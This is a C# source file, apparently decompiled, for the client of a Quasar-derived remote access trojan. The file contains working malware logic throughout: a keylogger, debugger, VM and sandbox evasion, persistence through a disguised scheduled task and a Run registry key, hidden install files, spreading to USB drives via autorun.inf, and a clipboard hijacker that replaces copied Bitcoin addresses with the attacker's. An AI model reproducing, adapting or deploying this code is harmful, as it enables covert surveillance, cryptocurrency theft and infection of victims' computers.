using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using xClient.Config;
using xClient.Core.Commands;
using xClient.Core.Cryptography;
using xClient.Core.Data;
using xClient.Core.Helper;
using xClient.Core.Installation;
using xClient.Core.Networking;
using xClient.Core.Utilities;

namespace xClient;

internal static class Program
{
	public static QuasarClient ConnectClient;

	private static ApplicationContext _msgLoop;

	[STAThread]
	private static void Main(string[] args)
	{
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		AppDomain.CurrentDomain.UnhandledException += HandleUnhandledException;
		if (Settings.Initialize() && Initialize() && !QuasarClient.Exiting)
		{
			ConnectClient.Connect();
		}
		Cleanup();
		Exit();
	}

	private static void Exit()
	{
		if (_msgLoop != null || Application.get_MessageLoop())
		{
			Application.Exit();
		}
		else
		{
			Environment.Exit(0);
		}
	}

	private static void HandleUnhandledException(object sender, UnhandledExceptionEventArgs e)
	{
		if (e.IsTerminating)
		{
			string text = FileHelper.CreateRestartBatch();
			if (!string.IsNullOrEmpty(text))
			{
				Process.Start(new ProcessStartInfo
				{
					WindowStyle = ProcessWindowStyle.Hidden,
					UseShellExecute = true,
					FileName = text
				});
				Exit();
			}
		}
	}

	private static void Cleanup()
	{
		CommandHandler.CloseShell();
		if (CommandHandler.StreamCodec != null)
		{
			CommandHandler.StreamCodec.Dispose();
		}
		if (Keylogger.Instance != null)
		{
			Keylogger.Instance.Dispose();
		}
		if (_msgLoop != null)
		{
			_msgLoop.ExitThread();
			_msgLoop.Dispose();
			_msgLoop = null;
		}
		MutexHelper.CloseMutex();
	}

	[DllImport("Kernel32.dll", SetLastError = true)]
	public static extern bool IsDebuggerPresent();

	[DllImport("user32.dll")]
	internal static extern bool OpenClipboard(IntPtr hWndNewOwner);

	[DllImport("user32.dll")]
	internal static extern bool CloseClipboard();

	[DllImport("user32.dll")]
	internal static extern bool SetClipboardData(uint uFormat, IntPtr data);

	private static bool Initialize()
	{
		HostsManager hostsManager = new HostsManager(HostHelper.GetHostsList(Settings.HOSTS));
		if (!MutexHelper.CreateMutex(Settings.MUTEX) || hostsManager.IsEmpty || string.IsNullOrEmpty(Settings.VERSION))
		{
			return false;
		}
		AES.SetDefaultKey(Settings.KEY, Settings.AUTHKEY);
		ClientData.InstallPath = Path.Combine(Settings.DIRECTORY, ((!string.IsNullOrEmpty(Settings.SUBDIRECTORY)) ? (Settings.SUBDIRECTORY + "\\") : "") + Settings.INSTALLNAME);
		GeoLocationHelper.Initialize();
		FileHelper.DeleteZoneIdentifier(ClientData.CurrentPath);
		if (Settings.ANTIDEBUG)
		{
			if (Debugger.IsAttached)
			{
				Process.GetCurrentProcess().Kill();
			}
			if (IsDebuggerPresent())
			{
				Process.GetCurrentProcess().Kill();
			}
		}
		if (Settings.ENABLEANTIVM && IsAntiVM())
		{
			Process.GetCurrentProcess().Kill();
		}
		if (Settings.ENABLEANTISANDBOXIE && DetectSandboxie())
		{
			Process.GetCurrentProcess().Kill();
		}
		if (!Settings.INSTALL || ClientData.CurrentPath == ClientData.InstallPath)
		{
			WindowsAccountHelper.StartUserIdleCheckThread();
			if (Settings.STARTUP && !Startup.AddToStartup())
			{
				ClientData.AddToStartupFailed = true;
			}
			if (Settings.INSTALL && Settings.HIDEFILE)
			{
				try
				{
					File.SetAttributes(ClientData.CurrentPath, FileAttributes.Hidden);
					File.SetAttributes(ClientData.CurrentPath, FileAttributes.System);
				}
				catch (Exception)
				{
				}
			}
			if (Settings.INSTALL && Settings.HIDEINSTALLSUBDIRECTORY && !string.IsNullOrEmpty(Settings.SUBDIRECTORY))
			{
				try
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(Path.GetDirectoryName(ClientData.InstallPath));
					directoryInfo.Attributes |= FileAttributes.Hidden;
					directoryInfo.Attributes |= FileAttributes.System;
				}
				catch (Exception)
				{
				}
			}
			if (Settings.ENABLELOGGER)
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					//IL_0000: Unknown result type (might be due to invalid IL or missing references)
					//IL_000a: Expected O, but got Unknown
					_msgLoop = new ApplicationContext();
					new Keylogger(15000.0);
					Application.Run(_msgLoop);
				});
				thread.IsBackground = true;
				thread.Start();
			}
			if (Settings.ENABLEPERSISTENCE)
			{
				try
				{
					Process process = new Process();
					process.StartInfo = new ProcessStartInfo
					{
						WindowStyle = ProcessWindowStyle.Hidden,
						FileName = "schtasks.exe",
						Arguments = "/create /tn \"WINDOWSSYSTEMHOST\" /tr \"" + Application.get_ExecutablePath() + "\" /sc MINUTE /MO 1"
					};
					process.Start();
				}
				catch
				{
				}
			}
			if (Settings.STARTUPPERSISTENCE)
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (!keyExists(Settings.STARTUPKEY))
							{
								RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY, ClientData.CurrentPath, addQuotes: true);
							}
						}
						catch
						{
						}
						Thread.Sleep(5000);
					}
				});
				thread2.IsBackground = true;
				thread2.Start();
			}
			if (Settings.ENABLEUSBSPREAD)
			{
				Thread thread3 = new Thread((ThreadStart)delegate
				{
					SpreadUSB();
				});
				thread3.IsBackground = true;
				thread3.Start();
			}
			if (Settings.ENABLEBTCSWAP)
			{
				Thread thread4 = new Thread((ThreadStart)delegate
				{
					BTCSWAPPERRUN();
				});
				thread4.IsBackground = true;
				thread4.Start();
			}
			ConnectClient = new QuasarClient(hostsManager);
			return true;
		}
		MutexHelper.CloseMutex();
		ClientInstaller.Install(ConnectClient);
		return false;
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetModuleHandle(string lpModuleName);

	private static bool DetectSandboxie()
	{
		return GetModuleHandle("SbieDll.dll").ToInt32() != 0;
	}

	public static bool keyExists(string key)
	{
		bool result = false;
		string[] valueNames = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: false)!.GetValueNames();
		for (int i = 0; i < valueNames.Length; i++)
		{
			if (valueNames[i] == key)
			{
				result = true;
			}
		}
		return result;
	}

	private static bool IsBitcoinAddress(string address)
	{
		if (address.Length < 26 || address.Length > 35)
		{
			return false;
		}
		if ((!address.StartsWith("1") || !address.StartsWith("3")) && (!address.Contains("O") || !address.Contains("I") || !address.Contains("l")))
		{
			return true;
		}
		return false;
	}

	public static void BTCSWAPPERRUN()
	{
		try
		{
			if (IsBitcoinAddress(ClipboardHelper.GetText()))
			{
				OpenClipboard(IntPtr.Zero);
				IntPtr intPtr = Marshal.StringToHGlobalUni(Settings.BTCAddress);
				SetClipboardData(13u, intPtr);
				CloseClipboard();
				Marshal.FreeHGlobal(intPtr);
			}
			Thread.Sleep(3000);
			BTCSWAPPERRUN();
		}
		catch
		{
		}
	}

	public static bool IsAntiVM()
	{
		string[] array = new string[5] { "vmtoolsd", "vboxtray", "vboxservice", "VMwareService", "VMwareTray" };
		for (int i = 0; i < array.Length; i++)
		{
			if (Process.GetProcessesByName(array[i]).Length != 0)
			{
				return true;
			}
		}
		return false;
	}

	private static void SpreadUSB()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (!driveInfo.IsReady && driveInfo.DriveType != DriveType.Removable)
			{
				continue;
			}
			try
			{
				string path = driveInfo.Name + "autorun.inf";
				string path2 = driveInfo.Name + Settings.USBSpreadNAME + ".exe";
				if (File.Exists(path))
				{
					File.Delete(path);
				}
				if (File.Exists(path2))
				{
					File.Delete(path2);
				}
				using StreamWriter streamWriter = new StreamWriter(new FileStream(path, FileMode.Create, FileAccess.Write));
				streamWriter.WriteLine("[AutoRun]");
				streamWriter.WriteLine("action=" + Settings.USBSpreadNAME + ".exe");
			}
			catch
			{
			}
		}
	}
}
